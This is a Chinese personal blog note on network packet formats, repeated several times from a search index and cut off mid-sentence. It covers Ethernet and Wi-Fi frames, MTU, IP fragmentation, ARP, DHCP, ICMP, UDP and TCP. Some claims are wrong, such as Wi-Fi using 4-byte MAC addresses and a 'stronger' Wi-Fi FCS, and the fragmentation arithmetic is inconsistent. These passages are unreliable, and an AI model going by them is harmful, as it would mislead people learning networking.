地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#udp"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 时，表示此报文段中有紧急数据，是高优先级的数据，应尽快传送，不用再缓存里排队，配合紧急指针字段使用 **确认位 ACK：**ACK = 1 时确认号有效，在连接建立之后所有传送的报文段都必须把 ACK 置为 1 **推送位 PSH：**PSH = 1 时，接收方尽快交付接受应用程序，不再等到缓存填满再向上交付（和紧急位是对应的，紧急位是发送发优先发送，推送位是接收方优先向上交付） 复位 RST：RST = 1 时，表明 TCP 连接中出现严重差错，必须释放连接，然后再重新建立传输连接 同步位 SYN：SYN = 1 时，表明是一个连接请求/连接接收报文 **终止位 FIN：**FIN = 1 时，表明此报文段发送方数据已发送完，要求释放连接 **窗口：**指发送本报文段的一方的接收窗口，即现在允许对方发送的数据量 **检验和：**检验首部 + 数据，检验时要加上 12B 伪首部，伪首部第四个字段是 6 **紧急指针：**URG = 1 时才有意义，指出本报文段中紧急数据的字节数 **选项：**最大报文段","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#tcp-的头部格式"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP TCP 的头部格式 头部最小 20 字节, 也就是说发送 1 字节的数据, ip 头 +tcp 头需要 41 字节. **序号（seq）：**在一个 TCP 连接中传送的字节流中的每一个字节都按序编号，本字段表示本报文段所发送数据的第一个字节的序号 **确认号（ack）：**期望收到对方下一个报文段的第一个数据字节的序号。如果确认号为 N，则证明到序号 N - 1 为止的所有数据都已正确收到 **数据偏移（首部长度）：**TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远，以 4B 为单位，即 1 个数值是 4B **紧急位 URG：**URG = 1 